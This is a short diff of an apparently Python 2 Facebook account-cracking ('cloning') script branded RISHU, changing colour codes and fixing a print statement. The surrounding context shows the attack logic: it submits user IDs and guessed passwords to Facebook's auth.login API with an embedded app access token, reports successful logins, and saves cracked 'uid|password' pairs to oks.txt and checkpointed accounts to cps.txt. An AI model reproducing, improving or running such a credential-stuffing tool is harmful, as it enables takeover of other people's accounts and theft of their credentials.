@@ -974,8 +974,8 @@ def crack2():
         print("\033[1;97m-------------------------------------------------")
 	print("\033[1;97m[!] The cloning process has been completed")
 	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
-	print("\033[1;97m[!] CP file saved as : cps.txt")
-	print("\033[1;97m[!] OK file saved as : oks.txt")
+	print("\033[1;97m[!] CP file saved as : \x1b[1;31mcps.txt")
+	print("\033[1;97m[!] OK file saved as : \x1b[1;32moks.txt")
         print("\033[1;97m-------------------------------------------------")
 	raw_input("\033[1;97m[!] Press Enter To Main Menu Back")
 	menu()
@@ -1167,7 +1167,7 @@ def choice2():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
+								print("\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
 				                                ok = open("/sdcard/oks.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
